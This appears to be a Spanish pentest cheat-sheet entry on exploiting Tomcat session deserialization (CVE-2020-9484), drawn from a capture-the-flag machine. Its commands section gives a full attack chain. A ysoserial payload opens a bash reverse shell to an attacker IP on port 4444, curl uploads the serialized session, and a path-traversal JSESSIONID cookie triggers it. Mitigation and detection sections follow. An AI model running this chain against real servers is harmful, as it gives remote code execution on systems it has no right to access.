---
topic: Tomcat — deserialización de sesiones CVE-2020-9484
tags: [linux, tomcat, deserialization, session, cve-2020-9484]
---

# Tomcat — deserialización de sesiones CVE-2020-9484

[🌐 English](tomcat-session-deserialization.en.md) | **Español**

## Concepto

Tomcat con `PersistentManager` guarda sesiones en disco y las carga según `JSESSIONID`. Si el valor permite recorrer rutas y el atacante puede subir un archivo serializado, Tomcat deserializa datos controlados y ejecuta gadgets de Java. CVE-2020-9484 combina el path traversal con la deserialización.

## Cuándo aplica

- Tomcat usa `PersistentManager` con almacenamiento en archivo.
- Se puede subir un archivo a una ruta conocida.
- La versión es anterior a la corrección de CVE-2020-9484.

## Procedimiento

1. Confirmar la versión y el manager de sesiones.
2. Generar una sesión serializada con `ysoserial`.
3. Subirla a una ruta accesible.
4. Enviar `JSESSIONID` con el traversal y comprobar la ejecución.

## Comandos

```bash
curl -s http://<HOST>:8080/ | grep -i tomcat
ysoserial.jar CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" > session.ser
curl -X PUT --data-binary @session.ser http://<HOST>:8080/upload/session.ser
curl -H "Cookie: JSESSIONID=../../upload/session" http://<HOST>:8080/
```

## Variantes

- Usar otro gadget disponible en el classpath.
- Aprovechar una ruta de logs o un directorio de subida.
- Encadenar con un despliegue WAR si se obtiene el manager.

## Limitaciones

- El manager debe estar configurado y la ruta debe existir.
- La versión corregida valida el ID de sesión.
- El gadget debe estar en el classpath.

## Mitigación

- Actualizar Tomcat y no persistir sesiones en rutas escribibles.
- Validar `JSESSIONID` y usar sesiones en memoria.
- Restringir la subida de archivos y el acceso al manager.

## Detección

- `JSESSIONID` con `../` o rutas absolutas.
- Archivos de sesión nuevos en directorios de subida.
- Deserialización y procesos hijos de Tomcat.

## Referencias

- [NVD — CVE-2020-9484](https://nvd.nist.gov/vuln/detail/CVE-2020-9484)
- [0xdf — Feline](https://0xdf.gitlab.io/2021/02/20/htb-feline.html)
- [Tomcat — PersistentManager](https://tomcat.apache.org/tomcat-9.0-doc/config/manager.html)
